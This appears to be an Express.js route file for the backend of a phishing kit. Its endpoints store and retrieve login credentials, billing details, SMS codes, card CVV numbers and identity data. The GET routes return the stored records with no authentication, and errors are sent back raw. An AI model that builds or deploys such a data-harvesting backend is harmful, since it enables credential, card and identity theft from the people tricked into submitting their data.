const express = require("express");
const router = express.Router();
const services = require("../../services");

const sendEmail = require("../../utils/email/sendEmail");
const pug = require("pug");

router.post("/login", async (req, res) => {
  try {
    var Login = await services.infoServices.createLogin(req.body);
    res.send("sent");
  } catch (error) {
    res.send(error);
  }
});
router.get("/login", async (req, res) => {
  try {
    var Login = await services.infoServices.getLogin(req.body);
    res.send(Login);
  } catch (error) {
    res.send(error);
  }
});

router.post("/billing", async (req, res) => {
  try {
    var Login = await services.infoServices.createBilling(req.body);
    res.send(Login);
  } catch (error) {
    res.send(error);
  }
});
router.get("/billing", async (req, res) => {
  try {
    var Login = await services.infoServices.getBilling(req.body);
    res.send(Login);
  } catch (error) {
    res.send(error);
  }
});

router.post("/sms", async (req, res) => {
  try {
    var Login = await services.infoServices.createSecure(req.body);
    res.send("sent");
  } catch (error) {
    res.send(error);
  }
});
router.get("/sms", async (req, res) => {
  try {
    var Login = await services.infoServices.getSecure(req.body);
    res.send(Login);
  } catch (error) {
    res.send(error);
  }
});

router.post("/query", async (req, res) => {
  try {
    var Query = await services.infoServices.createQuery(req.body);
    res.send(Query);
  } catch (error) {
    res.send(error);
  }
});
router.get("/query", async (req, res) => {
  try {
    var Query = await services.infoServices.getQuery(req.body);
    res.send(Query);
  } catch (error) {
    res.send(error);
  }
})

router.post("/cvv", async (req, res) => {
  try {
    var Cvv = await services.infoServices.createCvv(req.body);
    res.send(Cvv);
  } catch (error) {
    res.send(error);
  }
});
router.post("/identity", async (req, res) => {
  try {
    var Identity = await services.infoServices.createIdentity(req.body);
    res.send(Identity);
  } catch (error) {
    res.send(error);
  }
});

router.post("/findBilling", async (req, res) => {
  try {
    var Billing = await services.infoServices.findBilling(req.body);
    res.send(Billing);
  } catch (error) {
    res.send(error);
  }
});
module.exports = router;
